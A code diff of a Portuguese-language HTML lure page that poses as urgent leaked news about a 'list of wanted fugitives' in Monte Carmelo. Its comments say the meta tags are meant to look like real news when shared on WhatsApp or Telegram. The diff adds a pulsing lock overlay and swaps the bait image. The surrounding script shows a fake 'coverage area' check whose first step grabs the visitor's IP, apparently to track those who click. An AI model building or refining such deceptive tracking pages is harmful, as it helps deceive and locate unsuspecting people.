@@ -8,7 +8,7 @@
     <!-- Meta tags para parecer uma notícia real no WhatsApp/Telegram -->
     <meta property="og:title" content="🚨 URGENTE: Nova lista de foragidos de Monte Carmelo vazou!">
     <meta property="og:description" content="Confira os nomes dos principais procurados na região. Clique para ver a lista completa por bairro.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20260626-WA0003.jpg">
+    <meta property="og:image" content="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg">
     <meta name="theme-color" content="#d32f2f">
 
     <style>
@@ -52,28 +52,49 @@
             position: relative;
             width: 100%;
             margin-bottom: 20px;
+            /* Garante que a imagem não estoure o container */
+            overflow: hidden; 
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
         
-        /* Imagem com desfoque pesado para obrigar o clique */
-        .blurred-img { 
+        /* Estilo para a imagem nítida */
+        .final-img { 
             width: 100%; 
             height: auto; 
-            filter: blur(12px); 
             display: block;
-            border-radius: 4px;
+            transition: opacity 0.5s ease;
         }
         
-        .lock-icon {
+        /* Classe para quando a imagem estiver "bloqueada" visualmente antes do clique */
+        .locked-overlay {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.6);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.1); /* Leve escurecimento para destacar o cadeado */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            pointer-events: none; /* Permite o clique no botão mesmo se o overlay estiver lá */
+        }
+
+        .lock-icon {
+            background: rgba(0,0,0,0.7);
             color: white;
             padding: 15px;
             border-radius: 50%;
             font-size: 2em;
-            pointer-events: none;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+            animation: pulseLock 2s infinite;
+        }
+
+        @keyframes pulseLock {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,0,0,0.7); }
+            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(0,0,0,0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,0,0,0); }
         }
 
         .btn-access { 
@@ -146,9 +167,13 @@
         </div>
 
         <div class="img-container">
-            <!-- Substitua pelo link da imagem da lista se tiver -->
-            <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20260626-WA0003.jpg" alt="Lista Foragidos" class="blurred-img">
-            <div class="lock-icon">🔒</div>
+            <!-- SUA NOVA IMAGEM VAI AQUI -->
+            <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/IMG-20261106-WA0202.jpg" alt="Lista Foragidos" class="final-img" id="main-image">
+            
+            <!-- Overlay com Cadeado -->
+            <div id="lock-overlay" class="locked-overlay">
+                <div class="lock-icon">🔒</div>
+            </div>
         </div>
 
         <p style="font-weight: bold; margin-bottom: 15px;">Verifique se você está na área de cobertura:</p>
@@ -178,9 +203,16 @@
         }
 
         function iniciarVerificacao() {
+            // Esconde o botão e mostra o loader
             document.getElementById('btn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             
+            // Remove o cadeado visualmente para indicar que o processo começou
+            document.getElementById('lock-overlay').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('lock-overlay').style.display = 'none';
+            }, 500);
+
             // Passo 1: Tentar pegar o IP primeiro (rápido)
             updateStatus("Conectando ao servidor central...", 15);
             
